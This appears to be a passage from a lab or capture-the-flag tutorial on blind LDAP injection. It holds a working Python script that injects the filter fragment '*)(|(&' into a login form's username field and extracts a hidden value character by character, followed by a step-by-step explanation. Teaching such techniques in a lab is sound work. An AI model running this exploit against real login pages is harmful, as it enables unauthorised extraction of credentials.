To automate the exfiltration of data in the previous task, you can use the Python script below:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://10.10.211.54/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

## **script break down**

1. **Imports**:
    - `requests`: A Python library for making HTTP requests.
    - `BeautifulSoup` from `bs4`: A library for parsing HTML documents, making it easier to navigate and search the parse tree.
    - `string`: A module containing common string operations, including a collection of string constants.
    - `time`: A module providing various time-related functions.
2. **Setup**:
    - The `url` variable is set to `'http://10.10.211.54/blind.php'`, which is the target URL where the HTTP POST requests will be sent.
    - `char_set` includes lowercase and uppercase letters, digits, and a selection of special characters. This set represents all the characters the script will iterate over to guess the password.
3. **Variables Initialization**:
    - `successful_response_found` is a flag used to control the while loop. It starts as `True` to enter the loop and is set to `False` when no successful character is found.
    - `successful_chars` stores the sequence of successfully guessed characters.
4. **HTTP Headers**:
    - A dictionary `headers` is defined with the content type set to `'application/x-www-form-urlencoded'`, indicating the body format of the HTTP POST request.
5. **Main Loop**:
    - The script enters a `while` loop that continues as long as `successful_response_found` is `True`.
    - Inside this loop, it iterates over each character in `char_set`.
6. **Crafting and Sending HTTP Requests**:
    - For each character, the script creates a dictionary `data` with a key-value pair intended for the HTTP POST request. The `username` field is injected with a payload combining successfully found characters and the current character being tested, followed by `*)(|(&`, which is part of the injection syntax. The `password` field is arbitrarily set to `'pwd)'`.
    - An HTTP POST request is sent to the target `url` with the crafted `data` and `headers`.
7. **Response Handling**:
    - The response content is parsed with BeautifulSoup to analyze the HTML structure.
    - The script looks for `<p>` tags with a `style` attribute of `'color: green;'`, which is assumed to indicate a successful guess.
8. **Character Verification**:
    - If such paragraphs are found, it means the current character is part of the password. This character is then appended to `successful_chars`, and the script breaks out of the inner loop to test the next character.
    - If no paragraphs meet the criteria, the script concludes that no successful characters were found in the current iteration, prints a message, and exits the loop.
9. **Output**:
    - Once all characters have been tested or the correct sequence is found, the script prints the final sequence of successfully found characters.

The above script iteratively guesses the characters of the email by observing the web application's behaviour in response to crafted input.
